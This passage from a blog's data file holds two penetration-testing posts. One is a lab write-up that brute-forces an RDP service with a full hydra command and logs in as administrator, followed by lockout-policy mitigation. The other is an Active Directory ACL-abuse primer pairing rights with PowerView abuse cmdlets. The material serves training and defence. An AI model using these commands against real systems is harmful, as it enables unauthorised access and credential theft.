rdp://10.6.23.164:3333 \n```\n\nSo basically the commands takes in a user and a password wordlist to bruteforce against the rdp service with the specified port number during enumeration.\n\nAs we can see immediately we get some credentials that we can try logging in with, the account administrator seems perfect cause it has more privileges as compared to the rest so we'll login with that one to get the flag.\n\n![](https://i.imgur.com/qtz5e8G.png)\n\n#### *N|B* \nduring an engagement it's necessary to check or limit the bruteforce speed as not to cause a denial of service on the service you are pentesting.\n\n### RDP login\n\nHaving enumerated some credentials, we can login via rdp using the xfreerdp tool since that's what is installed in this instance i have, but there are many tools out there that you can use to login via rdp.\n\nMoving forward we'll login via xfreerdp.\n\n![](https://i.imgur.com/Gp5D6kn.png)\n\n![](https://i.imgur.com/LvnIpr5.png)\n\nWe see we have a GUI instance of RDP connection on the target machine, now we can fetch the flag from the C:/ drive.\n\n![](https://i.imgur.com/VWadcyX.png)\n\n\n### Mitigation Against Bruteforce\nThe Bruteforce attack that we just performed can be mitigated. It requires the creation of an Account Policy that will prevent Hydra or any other tool from trying multiple credentials. It is essentially a Lockout Policy. To toggle this policy, we need to open the Local Security Policy window. This can be done by typing **“secpol.msc”**. \n\nChecking out the Account policy we can see there no policies implemented which falls under misconfigurations which lead to such exploitations.\n\n![](https://i.imgur.com/8XxUKeD.png)\n\nTo get to the particular policy we need to Account Policies under Security Settings. Inside the Account Policies, there exists an Account Lockout Policy. It contains 3 policies each working on an aspect of the Account Lockout. \n\nThe first one controls the duration of the lockout. This is the time that is required to be passed to log in again after the lockout. Then we have the Lockout Threshold. This controls the number of invalid attempts. Please toggle these as per your requirements. This should prevent the Bruteforce attack.\n\n![](https://i.imgur.com/vNRevnq.png)\n\nAfter trying the Bruteforce attack using Hydra, it can be observed that it is not possible to extract the credentials as before. Although there is still some risk that can be prevented by forcing the users to change the passwords frequently and enforcing good password policies.\n\n![](https://i.imgur.com/YwhqTHW.png)\n\nAs we enabled a lockout policy, we will not be able to log in on the machine even with the correct password until the time passed that we toggled in the policy. \n\n\n\n\n\n\n\n","source":"_posts/Exploiting-services-series/insecure-rdp.md","raw":"---\ntitle: \"INSECURE RDP\"\ndate: 2023-10-13T17:21:14+03:00\ndraft: false\ntags: [\"rdp\"]\nShowReadingTime: true\ndescription: \"Exploiting insecure RDP Services\"\nShowPostNavLinks: true\ntop_img: /images/cyberpunk-red.jpg\nShowToc: true\n---\n\n**Objective:** \n\nExploit the application and retrieve the flag!\n\n### Enumeration\n\nRunning nmap on our target, we see there's a distinct port `3333` with a very peculiar service `dec-notes`. Our focus primarily will be exploiting the insecure rdp service.\n\n![](https://i.imgur.com/I1s9edD.png)\n\n\n### Metasploit\n\nTo confirm if the target is running rdp we'll use a metasploit module called `rdp-scanner` what it does is it attempts to connect to the specified RDP port and determines if it *\"speaks\"* RDP. \n\nSetting up the required variables for the module, we get an interesting response it's running RDP!!\n\n![](https://i.imgur.com/54Cb8jL.png)\n\n### Bruteforcing credentials\n\nBut for us to get the flag we need credentials that we can login in using rdp to get the flag, for that we'll need to bruteforce some credentials.\n\nWe'll need to use hydra for this bruteforce.\n\n```bash \nhydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.6.23.164:3333 \n```\n\nSo basically the commands takes in a user and a password wordlist to bruteforce against the rdp service with the specified port number during enumeration.\n\nAs we can see immediately we get some credentials that we can try logging in with, the account administrator seems perfect cause it has more privileges as compared to the rest so we'll login with that one to get the flag.\n\n![](https://i.imgur.com/qtz5e8G.png)\n\n#### *N|B* \nduring an engagement it's necessary to check or limit the bruteforce speed as not to cause a denial of service on the service you are pentesting.\n\n### RDP login\n\nHaving enumerated some credentials, we can login via rdp using the xfreerdp tool since that's what is installed in this instance i have, but there are many tools out there that you can use to login via rdp.\n\nMoving forward we'll login via xfreerdp.\n\n![](https://i.imgur.com/Gp5D6kn.png)\n\n![](https://i.imgur.com/LvnIpr5.png)\n\nWe see we have a GUI instance of RDP connection on the target machine, now we can fetch the flag from the C:/ drive.\n\n![](https://i.imgur.com/VWadcyX.png)\n\n\n### Mitigation Against Bruteforce\nThe Bruteforce attack that we just performed can be mitigated. It requires the creation of an Account Policy that will prevent Hydra or any other tool from trying multiple credentials. It is essentially a Lockout Policy. To toggle this policy, we need to open the Local Security Policy window. This can be done by typing **“secpol.msc”**. \n\nChecking out the Account policy we can see there no policies implemented which falls under misconfigurations which lead to such exploitations.\n\n![](https://i.imgur.com/8XxUKeD.png)\n\nTo get to the particular policy we need to Account Policies under Security Settings. Inside the Account Policies, there exists an Account Lockout Policy. It contains 3 policies each working on an aspect of the Account Lockout. \n\nThe first one controls the duration of the lockout. This is the time that is required to be passed to log in again after the lockout. Then we have the Lockout Threshold. This controls the number of invalid attempts. Please toggle these as per your requirements. This should prevent the Bruteforce attack.\n\n![](https://i.imgur.com/vNRevnq.png)\n\nAfter trying the Bruteforce attack using Hydra, it can be observed that it is not possible to extract the credentials as before. Although there is still some risk that can be prevented by forcing the users to change the passwords frequently and enforcing good password policies.\n\n![](https://i.imgur.com/YwhqTHW.png)\n\nAs we enabled a lockout policy, we will not be able to log in on the machine even with the correct password until the time passed that we toggled in the policy. \n\n\n\n\n\n\n\n","slug":"Exploiting-services-series/insecure-rdp","published":1,"updated":"2024-07-16T20:38:20.346Z","_id":"clyouz1ia0001wgjn3zdbe0sk","comments":1,"layout":"post","photos":[],"content":"<p><strong>Objective:</strong> </p>\n<p>Exploit the application and retrieve the flag!</p>\n<h3 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h3><p>Running nmap on our target, we see there’s a distinct port <code>3333</code> with a very peculiar service <code>dec-notes</code>. Our focus primarily will be exploiting the insecure rdp service.</p>\n<p><img src=\"https://i.imgur.com/I1s9edD.png\"></p>\n<h3 id=\"Metasploit\"><a href=\"#Metasploit\" class=\"headerlink\" title=\"Metasploit\"></a>Metasploit</h3><p>To confirm if the target is running rdp we’ll use a metasploit module called <code>rdp-scanner</code> what it does is it attempts to connect to the specified RDP port and determines if it <em>“speaks”</em> RDP. </p>\n<p>Setting up the required variables for the module, we get an interesting response it’s running RDP!!</p>\n<p><img src=\"https://i.imgur.com/54Cb8jL.png\"></p>\n<h3 id=\"Bruteforcing-credentials\"><a href=\"#Bruteforcing-credentials\" class=\"headerlink\" title=\"Bruteforcing credentials\"></a>Bruteforcing credentials</h3><p>But for us to get the flag we need credentials that we can login in using rdp to get the flag, for that we’ll need to bruteforce some credentials.</p>\n<p>We’ll need to use hydra for this bruteforce.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.6.23.164:3333 </span><br></pre></td></tr></table></figure>\n\n<p>So basically the commands takes in a user and a password wordlist to bruteforce against the rdp service with the specified port number during enumeration.</p>\n<p>As we can see immediately we get some credentials that we can try logging in with, the account administrator seems perfect cause it has more privileges as compared to the rest so we’ll login with that one to get the flag.</p>\n<p><img src=\"https://i.imgur.com/qtz5e8G.png\"></p>\n<h4 id=\"N-B\"><a href=\"#N-B\" class=\"headerlink\" title=\"N|B\"></a><em>N|B</em></h4><p>during an engagement it’s necessary to check or limit the bruteforce speed as not to cause a denial of service on the service you are pentesting.</p>\n<h3 id=\"RDP-login\"><a href=\"#RDP-login\" class=\"headerlink\" title=\"RDP login\"></a>RDP login</h3><p>Having enumerated some credentials, we can login via rdp using the xfreerdp tool since that’s what is installed in this instance i have, but there are many tools out there that you can use to login via rdp.</p>\n<p>Moving forward we’ll login via xfreerdp.</p>\n<p><img src=\"https://i.imgur.com/Gp5D6kn.png\"></p>\n<p><img src=\"https://i.imgur.com/LvnIpr5.png\"></p>\n<p>We see we have a GUI instance of RDP connection on the target machine, now we can fetch the flag from the C:&#x2F; drive.</p>\n<p><img src=\"https://i.imgur.com/VWadcyX.png\"></p>\n<h3 id=\"Mitigation-Against-Bruteforce\"><a href=\"#Mitigation-Against-Bruteforce\" class=\"headerlink\" title=\"Mitigation Against Bruteforce\"></a>Mitigation Against Bruteforce</h3><p>The Bruteforce attack that we just performed can be mitigated. It requires the creation of an Account Policy that will prevent Hydra or any other tool from trying multiple credentials. It is essentially a Lockout Policy. To toggle this policy, we need to open the Local Security Policy window. This can be done by typing <strong>“secpol.msc”</strong>. </p>\n<p>Checking out the Account policy we can see there no policies implemented which falls under misconfigurations which lead to such exploitations.</p>\n<p><img src=\"https://i.imgur.com/8XxUKeD.png\"></p>\n<p>To get to the particular policy we need to Account Policies under Security Settings. Inside the Account Policies, there exists an Account Lockout Policy. It contains 3 policies each working on an aspect of the Account Lockout. </p>\n<p>The first one controls the duration of the lockout. This is the time that is required to be passed to log in again after the lockout. Then we have the Lockout Threshold. This controls the number of invalid attempts. Please toggle these as per your requirements. This should prevent the Bruteforce attack.</p>\n<p><img src=\"https://i.imgur.com/vNRevnq.png\"></p>\n<p>After trying the Bruteforce attack using Hydra, it can be observed that it is not possible to extract the credentials as before. Although there is still some risk that can be prevented by forcing the users to change the passwords frequently and enforcing good password policies.</p>\n<p><img src=\"https://i.imgur.com/YwhqTHW.png\"></p>\n<p>As we enabled a lockout policy, we will not be able to log in on the machine even with the correct password until the time passed that we toggled in the policy. </p>\n","cover":false,"excerpt":"","more":"<p><strong>Objective:</strong> </p>\n<p>Exploit the application and retrieve the flag!</p>\n<h3 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h3><p>Running nmap on our target, we see there’s a distinct port <code>3333</code> with a very peculiar service <code>dec-notes</code>. Our focus primarily will be exploiting the insecure rdp service.</p>\n<p><img src=\"https://i.imgur.com/I1s9edD.png\"></p>\n<h3 id=\"Metasploit\"><a href=\"#Metasploit\" class=\"headerlink\" title=\"Metasploit\"></a>Metasploit</h3><p>To confirm if the target is running rdp we’ll use a metasploit module called <code>rdp-scanner</code> what it does is it attempts to connect to the specified RDP port and determines if it <em>“speaks”</em> RDP. </p>\n<p>Setting up the required variables for the module, we get an interesting response it’s running RDP!!</p>\n<p><img src=\"https://i.imgur.com/54Cb8jL.png\"></p>\n<h3 id=\"Bruteforcing-credentials\"><a href=\"#Bruteforcing-credentials\" class=\"headerlink\" title=\"Bruteforcing credentials\"></a>Bruteforcing credentials</h3><p>But for us to get the flag we need credentials that we can login in using rdp to get the flag, for that we’ll need to bruteforce some credentials.</p>\n<p>We’ll need to use hydra for this bruteforce.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.6.23.164:3333 </span><br></pre></td></tr></table></figure>\n\n<p>So basically the commands takes in a user and a password wordlist to bruteforce against the rdp service with the specified port number during enumeration.</p>\n<p>As we can see immediately we get some credentials that we can try logging in with, the account administrator seems perfect cause it has more privileges as compared to the rest so we’ll login with that one to get the flag.</p>\n<p><img src=\"https://i.imgur.com/qtz5e8G.png\"></p>\n<h4 id=\"N-B\"><a href=\"#N-B\" class=\"headerlink\" title=\"N|B\"></a><em>N|B</em></h4><p>during an engagement it’s necessary to check or limit the bruteforce speed as not to cause a denial of service on the service you are pentesting.</p>\n<h3 id=\"RDP-login\"><a href=\"#RDP-login\" class=\"headerlink\" title=\"RDP login\"></a>RDP login</h3><p>Having enumerated some credentials, we can login via rdp using the xfreerdp tool since that’s what is installed in this instance i have, but there are many tools out there that you can use to login via rdp.</p>\n<p>Moving forward we’ll login via xfreerdp.</p>\n<p><img src=\"https://i.imgur.com/Gp5D6kn.png\"></p>\n<p><img src=\"https://i.imgur.com/LvnIpr5.png\"></p>\n<p>We see we have a GUI instance of RDP connection on the target machine, now we can fetch the flag from the C:&#x2F; drive.</p>\n<p><img src=\"https://i.imgur.com/VWadcyX.png\"></p>\n<h3 id=\"Mitigation-Against-Bruteforce\"><a href=\"#Mitigation-Against-Bruteforce\" class=\"headerlink\" title=\"Mitigation Against Bruteforce\"></a>Mitigation Against Bruteforce</h3><p>The Bruteforce attack that we just performed can be mitigated. It requires the creation of an Account Policy that will prevent Hydra or any other tool from trying multiple credentials. It is essentially a Lockout Policy. To toggle this policy, we need to open the Local Security Policy window. This can be done by typing <strong>“secpol.msc”</strong>. </p>\n<p>Checking out the Account policy we can see there no policies implemented which falls under misconfigurations which lead to such exploitations.</p>\n<p><img src=\"https://i.imgur.com/8XxUKeD.png\"></p>\n<p>To get to the particular policy we need to Account Policies under Security Settings. Inside the Account Policies, there exists an Account Lockout Policy. It contains 3 policies each working on an aspect of the Account Lockout. </p>\n<p>The first one controls the duration of the lockout. This is the time that is required to be passed to log in again after the lockout. Then we have the Lockout Threshold. This controls the number of invalid attempts. Please toggle these as per your requirements. This should prevent the Bruteforce attack.</p>\n<p><img src=\"https://i.imgur.com/vNRevnq.png\"></p>\n<p>After trying the Bruteforce attack using Hydra, it can be observed that it is not possible to extract the credentials as before. Although there is still some risk that can be prevented by forcing the users to change the passwords frequently and enforcing good password policies.</p>\n<p><img src=\"https://i.imgur.com/YwhqTHW.png\"></p>\n<p>As we enabled a lockout policy, we will not be able to log in on the machine even with the correct password until the time passed that we toggled in the policy. </p>\n"},{"title":"ACL AD","date":"2024-01-03T21:00:00.000Z","draft":false,"description":"Access Control List","top_img":"/images/cyberpunk-red.jpg","_content":"\n\n## Access Control List (ACL) Abuse Primer\nFor security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.\n\n## Access Control List (ACL) Overview\nIn their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.\n\n### There are two types of ACLs:\n\n- Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.\n\n- System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.\n\nWe see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.\n\nViewing forend's ACL\n\n![](https://academy.hackthebox.com/storage/modules/143/DACL_example.png)\nThe SACLs can be seen within the Auditing tab.\n\nViewing the SACLs through the Auditing Tab\n\n![](https://academy.hackthebox.com/storage/modules/143/SACL_example.png)\n\n## Access Control Entries (ACEs)\nAs stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:\n\nACE\tDescription\n   - Access denied ACE -\tUsed within a DACL to show that a user or group is explicitly denied access to an object\n   - Access allowed ACE - Used within a DACL to show that a user or group is explicitly granted access to an object\n   - System audit ACE - Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred\n\nEach ACE is made up of the following four components:\n\nThe *security identifier (SID)* of the user/group that has access to the object (or principal name graphically)\nA flag denoting the type of ACE (access denied, allowed, or system audit ACE)\nA set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object\nAn access mask which is a 32-bit value that defines the rights granted to an object\nWe can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:\n\n## Viewing Permissions through Active Directory Users & Computers\n\n![](https://academy.hackthebox.com/storage/modules/143/ACE_example.png)\n\n1. The security principal is Angela Dunn (adunn@inlanefreight.local)\n2. The ACE type is Allow\n3. Inheritance applies to the \"This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted\n4. The rights granted to the object, again shown graphically in this example\n\nWhen access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.\n\n## Why are ACEs Important?\n\nAttackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the \"low hanging fruit\" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:\n\n- ForceChangePassword abused with Set-DomainUserPassword\n- Add Members abused with Add-DomainGroupMember\n- GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember\n- GenericWrite abused with Set-DomainObject\n- WriteOwner abused with Set-DomainObjectOwner\n- WriteDACL abused with Add-DomainObjectACL\n- AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember\n- Addself abused with Add-DomainGroupMember\n\n### enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:\n\n- ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).\n- GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.\n- AddSelf - shows security groups that a user can add themselves to.\n- GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the *Local Administrator Password Solution (LAPS)* is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.\n\nThis graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.\n\n![](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)\n\nWe will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there are tools such as GMSAPasswordReader that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It's worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.\n\n## ACL Attacks in the Wild\nWe can use ACL attacks for:\n\n- Lateral movement\n- Privilege escalation\n- Persistence\n\nSome common attack scenarios may include:\n\n### Attack Description\n\n\n|  Attack |  Description |\n|---|---|\n| Abusing forgot password permissions  |  Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain. |\n   Abusing group membership management    |  It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege. |   |\n   Excessive user rights | We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.\n\n\n\nNote: Some ACL attacks can be considered \"destructive,\" such as changing a user's password or performing other modifications within a client's AD domain. If in doubt, it's always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.","source":"_posts/active-directory/acls.md","raw":"---\ntitle: \"ACL AD\"\ndate: 2024-01-04\ndraft: false\ntags: [\"Active-Directory\", \"access control list\"]\ndescription: \"Access Control List\"\ntop_img: /images/cyberpunk-red.jpg\n---\n\n\n## Access Control List (ACL) Abuse Primer\nFor security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.\n\n## Access Control List (ACL) Overview\nIn their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.\n\n### There are two types of ACLs:\n\n- Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.\n\n- System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.\n\nWe see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.\n\nViewing forend's ACL\n\n![](https://academy.hackthebox.com/storage/modules/143/DACL_example.png)\nThe SACLs can be seen within the Auditing tab.\n\nViewing the SACLs through the Auditing Tab\n\n![](https://academy.hackthebox.com/storage/modules/143/SACL_example.png)\n\n## Access Control Entries (ACEs)\nAs stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:\n\nACE\tDescription\n   - Access denied ACE -\tUsed within a DACL to show that a user or group is explicitly denied access to an object\n   - Access allowed ACE - Used within a DACL to show that a user or group is explicitly granted access to an object\n   - System audit ACE - Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred\n\nEach ACE is made up of the following four components:\n\nThe *security identifier (SID)* of the user/group that has access to the object (or principal name graphically)\nA flag denoting the type of ACE (access denied, allowed, or system audit ACE)\nA set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object\nAn access mask which is a 32-bit value that defines the rights granted to an object\nWe can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:\n\n## Viewing Permissions through Active Directory Users & Computers\n\n![](https://academy.hackthebox.com/storage/modules/143/ACE_example.png)\n\n1. The security principal is Angela Dunn (adunn@inlanefreight.local)\n2. The ACE type is Allow\n3. Inheritance applies to the \"This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted\n4. The rights granted to the object, again shown graphically in this example\n\nWhen access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.\n\n## Why are ACEs Important?\n\nAttackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the \"low hanging fruit\" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:\n\n- ForceChangePassword abused with Set-DomainUserPassword\n- Add Members abused with Add-DomainGroupMember\n- GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember\n- GenericWrite abused with Set-DomainObject\n- WriteOwner abused with Set-DomainObjectOwner\n- WriteDACL abused with Add-DomainObjectACL\n- AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember\n- Addself abused with Add-DomainGroupMember\n\n### enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:\n\n- ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).\n- GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.\n- AddSelf - shows security groups that a user can add themselves to.\n- GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the *Local Administrator Password Solution (LAPS)* is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.\n\nThis graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.\n\n![](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)\n\nWe will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there are tools such as GMSAPasswordReader that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It's worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.\n\n## ACL Attacks in the Wild\nWe can use ACL attacks for:\n\n- Lateral movement\n- Privilege escalation\n- Persistence\n\nSome common attack scenarios may include:\n\n### Attack Description\n\n\n|  Attack |  Description |\n|---|---|\n| Abusing forgot password permissions  |  Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain. |\n   Abusing group membership management    |  It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege. |   |\n   Excessive user rights | We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.\n\n\n\nNote: Some ACL attacks can be considered \"destructive,\" such as changing a user's password or performing other modifications within a client's AD domain. If in doubt, it's always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.","slug":"active-directory/acls","published":1,"updated":"2024-07-16T20:38:03.026Z","_id":"clyouz1im0003wgjn5szqapgh","comments":1,"layout":"post","photos":[],"content":"<h2 id=\"Access-Control-List-ACL-Abuse-Primer\"><a href=\"#Access-Control-List-ACL-Abuse-Primer\" class=\"headerlink\" title=\"Access Control List (ACL) Abuse Primer\"></a>Access Control List (ACL) Abuse Primer</h2><p>For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.</p>\n<h2 id=\"Access-Control-List-ACL-Overview\"><a href=\"#Access-Control-List-ACL-Overview\" class=\"headerlink\" title=\"Access Control List (ACL) Overview\"></a>Access Control List (ACL) Overview</h2><p>In their simplest form, ACLs are lists that define a) who has access to which asset&#x2F;resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.</p>\n<h3 id=\"There-are-two-types-of-ACLs\"><a href=\"#There-are-two-types-of-ACLs\" class=\"headerlink\" title=\"There are two types of ACLs:\"></a>There are two types of ACLs:</h3><ul>\n<li><p>Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.</p>\n</li>\n<li><p>System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.</p>\n</li>\n</ul>\n<p>We see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.</p>\n<p>Viewing forend’s ACL</p>\n<p><img src=\"https://academy.hackthebox.com/storage/modules/143/DACL_example.png\"><br>The SACLs can be seen within the Auditing tab.</p>\n<p>Viewing the SACLs through the Auditing Tab</p>\n<p><img 